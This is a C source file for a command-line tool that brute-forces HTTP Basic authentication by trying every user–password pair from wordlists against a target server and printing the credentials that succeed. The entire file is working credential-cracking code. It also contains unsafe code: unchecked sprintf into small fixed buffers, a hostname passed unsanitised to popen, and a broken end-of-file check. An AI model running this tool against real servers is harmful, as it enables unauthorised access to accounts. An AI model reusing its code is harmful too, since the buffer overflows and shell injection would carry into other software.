/*
 * HTTP Basic Access Authentication Cracker
 * given dictionaries for users and password
 *
 * Copyright Tiago Teixeira, 2017
 *
*/
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <arpa/inet.h>

#include <errno.h>

#include "base64_table.h"
#include "parser.h"

/* Some dependencies */
/* Replace with PATH-accessible binaries */
#define DNS	"dns"	// for resolving hostname to IP 'dns <hostname>' -> '<ip>' - with popen

int	get_ip(const char*hostname);
int	readline(FILE*file,char*buffer);
void	base64(const char*username,const char*password,char*output);

int main(int argc,char**argv)
{
        struct baa_args args;
	if(parse_args(argc,argv,&args))
		return 1;
	int ip,sock,status;
	char*buffer=NULL;
	char base64_out[64];
	char cur_user[16];
	char cur_pass[32];
	struct sockaddr_in target;
	if((ip=get_ip(args.hostname))==-1)
	{
		fprintf(stderr,"could not get ip from hostname\n");
		return 1;
	}
	sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
	if(sock==-1)
	{
		fprintf(stderr,"could not create socket\n");
		return 1;
	}
	buffer=(char*)malloc(4096);	// should be enough
	if(buffer==NULL)
	{
		fprintf(stderr,"could not allocate memory\n");
		close(sock);
		return 1;
	}
	
	// Now the important stuff
	memset(&target,0,sizeof target);
	target.sin_family=AF_INET;
	target.sin_port=htons(args.port);
	target.sin_addr.s_addr = ip;
	
	// initial test
	if(args.verb)
		printf("Starting Initial test...");
	if(connect(sock,(struct sockaddr*)&target,sizeof target)<0)
	{
		if(args.verb)putchar('\n');
		fprintf(stderr,"could not connect to remote server\n");
		close(sock);
		free(buffer);
		exit(1);
	}
	status=1;
	sprintf(buffer,"GET / HTTP/1.1\r\nHost: %s\r\n\r\n",args.hostname);
	if(send(sock,buffer,strlen(buffer),0)<0)
	{
		if(args.verb)putchar('\n');
		fprintf(stderr,"error sending\n");
		close(sock);
		free(buffer);
		exit(1);
	}
	if(recv(sock,buffer,4096,0)<0)
	{
		if(args.verb)putchar('\n');
		fprintf(stderr,"error receiving\n");
		close(sock);
		free(buffer);
		exit(1);
	}
	/* check if connection is ending */
	if(strstr(buffer,"Connection: close")!=NULL)
	{
		/* close instead of shutdown */
		close(sock);
		sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
		if(sock==-1)
		{
			fprintf(stderr,"error creating socket\n");
			free(buffer);
			exit(1);
		}
		status=0;
	}
	/* check for status code 401
	   'HTTP/?.? 401' */
	if(strncmp(buffer+9,"401",3))
	{
		if(args.verb)putchar('\n');
		printf("the access to %s/ is authorized\n",args.hostname);
		close(sock);
		free(buffer);
		exit(0);
	}

	if(args.verb)
		printf("[OK]\nStarting search...\n");
	
	// now start doing stuff
	// for each user test all passwords
	while(!readline(args.userf,cur_user))
	{
		/* for each user in the list */
		/* no default user tho */
		while(!readline(args.passf,cur_pass))
		{
			/* try each password */
			base64(cur_user,cur_pass,base64_out);
			sprintf(buffer,"GET / HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic %s\r\n\r\n",args.hostname,base64_out);
			if(args.verb)
				printf("trying %s:%s -> %s\n",cur_user,cur_pass,base64_out);

			if(!status)
			{
				if(connect(sock,(struct sockaddr*)&target,sizeof target)<0)
				{
					fprintf(stderr,"error connecting [%d]\n",errno);
					close(sock);
					free(buffer);
					exit(1);
				}
				status=1;
			}
			if(send(sock,buffer,strlen(buffer),0)<0)
			{
				fprintf(stderr,"error sending\n");
				close(sock);
				free(buffer);
				exit(1);
			}
			if(recv(sock,buffer,4096,0)<0)
			{
				fprintf(stderr,"error receiving\n");
				close(sock);
				free(buffer);
				exit(1);
			}
			if(strstr(buffer,"Connection: close")!=NULL)
			{
				close(sock);
				sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
				if(sock==-1)
				{
					fprintf(stderr,"error creating socket\n");
					free(buffer);
					exit(1);
				}
				status=0;
			}
			if(strncmp(buffer+9,"401",3))
			{
				printf("terminated with status code %d with credentials %s:%s\n",atoi(buffer+9),cur_user,cur_pass);
				close(sock);
				free(buffer);
				/* well... its easier this way */
				exit(0);	// exit() closes all 'stdio.h' streams
			}
		}
		// reset password file to initital position
		fseek(args.passf,0,SEEK_SET);
	}
	// all done, none found
	printf("search complete, could not find the correct credentials\n");
	fclose(args.userf);
	fclose(args.passf);
	close(sock);
	free(buffer);
	
	return 0;
}

int get_ip(const char*h)
{
	char buf[32];
	FILE*out;
	int i=0;
	sprintf(buf,"%s %s",DNS,h);
	/* Call DNS with popen to get its output */
	out=popen(buf,"r");
	if(out==NULL)
		return -1;
	memset(buf,0,32);
	/* read output */
	while(fread(buf+i,1,1,out))i++;
	pclose(out);
	/* returns IP or -1 on error */
	return inet_addr(buf);
}

int readline(FILE*f,char*buf)
{
	int i=0;
	char ph; // PlaceHolder, avoid possible misuse of pointers
	while(fread(&ph,1,1,f))
	{
		if(ph=='\r')*(buf+i)='\0';
		else if(ph=='\n')
		{
			/* not good for MacOSX users tho */
			*(buf+i)='\0';
			break;
		}
		else *(buf+i)=ph;
		i++;
	}
	/* returns error on EOF
	   all lines should be terminated with '\n'
	   or last user/pass could not be used */
	if(ph==EOF)
		return 1;
	return 0;
}
void base64(const char*u,const char*p,char*out)
{
	unsigned char b64_ph[4],h;	// base64 PlaceHolder
	char pre[64];
	int o,i,l=strlen(u)+strlen(p)+1;
	memset(pre,0,64);
	sprintf(pre,"%s:%s",u,p);
	for(i=0,o=0;i<l-(l%3);i+=3)
	{
		/* 3 UTF-8 chars to 4 B64 chars */
		h=(*(pre+i))>>2;
		b64_ph[0]=base64_table[h];
		h=(((*(pre+i))&0x3)<<4)+((*(pre+i+1))>>4);
		b64_ph[1]=base64_table[h];
		h=(((*(pre+i+1))&0xf)<<2)+((*(pre+i+2))>>6);
		b64_ph[2]=base64_table[h];
		h=(*(pre+i+2))&0x3f;
		b64_ph[3]=base64_table[h];
		/* copy placeholder to output buffer */
		memcpy(out+o,b64_ph,4);
		o+=4;
	}
	/* check if there should be any '='s */
	if(l%3)
	{
		if((l%3)==1)
		{
			// 2 chars + 2 '='
			h=(*(pre+i))>>2;
			b64_ph[0]=base64_table[h];
			h=((*(pre+i))&0x3)<<4;
			b64_ph[1]=base64_table[h];
			b64_ph[2]='=';
			b64_ph[3]='=';
		}
		if((l%3)==2)
		{
			// 3 chars + '='
			h=(*(pre+i))>>2;
			b64_ph[0]=base64_table[h];
			h=(((*(pre+i))&0x3)<<4)+((*(pre+i+1))>>4);
			b64_ph[1]=base64_table[h];
			h=((*(pre+i+1))&0xf)<<2;
			b64_ph[2]=base64_table[h];
			b64_ph[3]='=';
		}
		memcpy(out+o,b64_ph,4);
		o+=4;
	}
	*(out+o)='\0';	// safety
}